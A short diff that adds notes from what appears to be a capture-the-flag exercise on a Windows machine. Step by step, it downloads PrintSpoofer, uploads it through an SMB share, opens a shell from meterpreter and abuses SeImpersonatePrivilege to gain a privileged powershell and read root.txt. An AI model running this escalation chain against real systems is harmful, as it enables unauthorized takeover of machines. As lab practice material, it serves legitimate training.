@@ -1,0 +1,18 @@
+getprivs 
+
+if you see a escalation vector using SeImpersonatePrivilege, you could try to use this:
+wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
+
+then put the exe in the smb share
+smbclient \\\\10.10.13.92\\nt4wrksv
+put PrintSpoofer64.exe
+dir (check)
+
+access meterpreter, switch to a shell
+shell
+cd c:/inetpub/wwwroot/nt4wrksv (to smb share)
+dir
+PrintSpoofer64.exe -i -c powershell.exe
+whoami
+cat root.txt
+
